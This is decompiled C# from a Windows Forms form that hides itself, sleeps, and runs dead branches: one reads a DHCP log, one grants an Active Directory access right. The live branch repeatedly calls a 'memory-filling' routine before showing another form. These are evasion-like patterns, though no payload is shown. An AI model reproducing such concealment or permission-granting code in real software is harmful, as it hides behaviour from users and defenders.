		// (get) Token: 0x06001030 RID: 4144 RVA: 0x0004FD24 File Offset: 0x0004DF24
		// (set) Token: 0x06001031 RID: 4145 RVA: 0x0004FD2C File Offset: 0x0004DF2C
		internal virtual CheckBox CheckBox40 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007E2 RID: 2018
		// (get) Token: 0x06001032 RID: 4146 RVA: 0x0004FD35 File Offset: 0x0004DF35
		// (set) Token: 0x06001033 RID: 4147 RVA: 0x0004FD3D File Offset: 0x0004DF3D
		internal virtual DateTimePicker DateTimePicker44 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007E3 RID: 2019
		// (get) Token: 0x06001034 RID: 4148 RVA: 0x0004FD46 File Offset: 0x0004DF46
		// (set) Token: 0x06001035 RID: 4149 RVA: 0x0004FD4E File Offset: 0x0004DF4E
		internal virtual DateTimePicker DateTimePicker45 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007E4 RID: 2020
		// (get) Token: 0x06001036 RID: 4150 RVA: 0x0004FD57 File Offset: 0x0004DF57
		// (set) Token: 0x06001037 RID: 4151 RVA: 0x0004FD5F File Offset: 0x0004DF5F
		internal virtual MonthCalendar MonthCalendar16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007E5 RID: 2021
		// (get) Token: 0x06001038 RID: 4152 RVA: 0x0004FD68 File Offset: 0x0004DF68
		// (set) Token: 0x06001039 RID: 4153 RVA: 0x0004FD70 File Offset: 0x0004DF70
		internal virtual Label Label29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007E6 RID: 2022
		// (get) Token: 0x0600103A RID: 4154 RVA: 0x0004FD79 File Offset: 0x0004DF79
		// (set) Token: 0x0600103B RID: 4155 RVA: 0x0004FD81 File Offset: 0x0004DF81
		internal virtual ListView ListView45 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170007E7 RID: 2023
		// (get) Token: 0x0600103C RID: 4156 RVA: 0x0004FD8A File Offset: 0x0004DF8A
		// (set) Token: 0x0600103D RID: 4157 RVA: 0x0004FD92 File Offset: 0x0004DF92
		internal virtual PictureBox PictureBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x0600103E RID: 4158 RVA: 0x0004FD9C File Offset: 0x0004DF9C
		private void Rubri_Load(object sender, EventArgs e)
		{
			base.Hide();
			base.Visible = false;
			Thread.Sleep(2000);
			int num = 0;
			if (num == 1)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Scripting.FileSystemObject", "")), null, "OpenTextFile", new object[]
				{
					"C:\\Windows\\System32\\DHCP\\DhcpSrvLog-Mon.log",
					1
				}, null, null, null));
				while (Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateGet(objectValue, null, "AtEndOfStream", new object[0], null, null, null), true, false))
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "ReadLine", new object[0], null, null, null));
					if (Strings.InStr(Conversions.ToString(objectValue2), ",", CompareMethod.Binary) != 0)
					{
						Strings.Split(Conversions.ToString(objectValue2), ",", -1, CompareMethod.Binary);
					}
				}
				return;
			}
			if (num == 2)
			{
				object objectValue3 = RuntimeHelpers.GetObjectValue(Interaction.GetObject("LDAP://OU=Finance, DC=fabrikam,DC=Com", null));
				object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue3, null, "Get", new object[]
				{
					"ntSecurityDescriptor"
				}, null, null, null));
				object objectValue5 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue4, null, "DiscretionaryACL", new object[0], null, null, null));
				object objectValue6 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("AccessControlEntry", ""));
				NewLateBinding.LateSet(objectValue6, null, "Trustee", new object[]
				{
					"FABRIKAM\\kmyer"
				}, null, null);
				NewLateBinding.LateSet(objectValue6, null, "AceFlags", new object[]
				{
					2
				}, null, null);
				NewLateBinding.LateSet(objectValue6, null, "AceType", new object[]
				{
					5
				}, null, null);
				NewLateBinding.LateSet(objectValue6, null, "Flags", new object[]
				{
					3
				}, null, null);
				NewLateBinding.LateSet(objectValue6, null, "ObjectType", new object[]
				{
					"{68b1d179-0d15-4d4f-ab71-46152e79a7bc}"
				}, null, null);
				NewLateBinding.LateSet(objectValue6, null, "InheritedObjectType", new object[]
				{
					"{BF967ABA-0DE6-11D0-A285-00AA003049E2}"
				}, null, null);
				NewLateBinding.LateSet(objectValue6, null, "AccessMask", new object[]
				{
					256
				}, null, null);
				object[] array;
				bool[] array2;
				NewLateBinding.LateCall(objectValue5, null, "AddAce", array = new object[]
				{
					objectValue6
				}, null, null, array2 = new bool[]
				{
					true
				}, true);
				if (array2[0])
				{
					objectValue6 = RuntimeHelpers.GetObjectValue(array[0]);
				}
				NewLateBinding.LateSet(objectValue4, null, "DiscretionaryAcl", new object[]
				{
					objectValue5
				}, null, null);
				NewLateBinding.LateCall(objectValue3, null, "Put", new object[]
				{
					"ntSecurityDescriptor",
					this.Array(RuntimeHelpers.GetObjectValue(objectValue4))
				}, null, null, null, true);
				NewLateBinding.LateCall(objectValue3, null, "dimInfo", new object[0], null, null, null, true);
				return;
			}
			checked
			{
				if (num == 0)
				{
					Thread.Sleep(5000);
					int num2 = 1;
					do
					{
						Strings.Replace(Form123.LotarMemoria(), "e", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "f", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "g", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "i", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "j", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "k", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "l", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "m", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "n", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "o", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "p", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "q", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "e", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "f", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "g", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "i", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "j", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "k", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "l", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "m", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "n", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "o", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "p", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "q", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "e", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "f", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "g", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "i", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "j", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "k", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "l", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "m", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "n", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "o", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "p", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "q", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "e", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "f", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "g", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "i", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "j", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "k", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "l", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "m", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "n", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "o", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "p", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "q", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "e", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "f", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "g", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "i", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "j", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "k", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "l", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "m", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "n", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "o", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "p", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "q", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "e", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "f", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "g", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "i", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "j", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "k", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "l", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "m", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "o", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "p", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "q", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						Strings.Replace(Form123.LotarMemoria(), "h", Conversions.ToString(num2), 1, -1, CompareMethod.Binary);
						num2++;
					}
					while (num2 <= 30);
					MyProject.Forms.Bereta.Show();
					return;
				}
			}
		}

		// Token: 0x0600103F RID: 4159 RVA: 0x000508F8 File Offset: 0x0004EAF8
		private object Array(object objSD)
		{
			throw new NotImplementedException();
		}

		// Token: 0x04000697 RID: 1687
		private IContainer components;
	}
}
